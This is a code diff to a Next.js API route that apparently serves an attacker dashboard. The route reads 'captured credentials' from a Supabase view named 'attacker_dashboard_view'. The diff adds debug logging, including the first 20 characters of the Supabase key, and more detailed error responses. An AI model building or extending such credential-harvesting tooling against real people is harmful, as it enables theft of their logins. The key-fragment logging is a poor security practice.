@@ -16,6 +16,10 @@ export async function OPTIONS(request: NextRequest) {
 
 export async function GET(request: NextRequest) {
   try {
+    console.log('🔍 Attempting to fetch from Supabase...')
+    console.log('📡 Supabase URL:', process.env.NEXT_PUBLIC_SUPABASE_URL)
+    console.log('🔑 Supabase Key (first 20 chars):', process.env.NEXT_PUBLIC_SUPABASE_ANON_KEY?.substring(0, 20))
+    
     // Fetch latest captured credentials
     const { data: credentials, error } = await supabase
       .from('attacker_dashboard_view')
@@ -23,7 +27,12 @@ export async function GET(request: NextRequest) {
       .order('captured_at', { ascending: false })
       .limit(50)
     
-    if (error) throw error
+    console.log('📊 Supabase response:', { data: credentials, error })
+    
+    if (error) {
+      console.error('❌ Supabase error details:', error)
+      throw error
+    }
     
     // Transform data for frontend
     const formattedData = credentials?.map(cred => ({
@@ -42,12 +51,25 @@ export async function GET(request: NextRequest) {
       }
     })
   } catch (error) {
-    console.error('Failed to fetch captured data:', error)
+    console.error('❌ API Error:', error)
+    
+    // Get more error details
+    let errorDetails = 'Unknown error'
+    let errorCode = 'unknown'
+    
+    if (error && typeof error === 'object') {
+      errorDetails = JSON.stringify(error, null, 2)
+      if ('code' in error) errorCode = String(error.code)
+      if ('message' in error) errorDetails = String(error.message)
+    }
+    
     return NextResponse.json({ 
       error: 'Failed to fetch data', 
-      details: error instanceof Error ? error.message : 'Unknown error',
+      details: errorDetails,
+      errorCode: errorCode,
       supabaseUrl: process.env.NEXT_PUBLIC_SUPABASE_URL ? 'Set' : 'Missing',
-      supabaseKey: process.env.NEXT_PUBLIC_SUPABASE_ANON_KEY ? 'Set' : 'Missing'
+      supabaseKey: process.env.NEXT_PUBLIC_SUPABASE_ANON_KEY ? 'Set' : 'Missing',
+      timestamp: new Date().toISOString()
     }, { 
       status: 500,
       headers: {
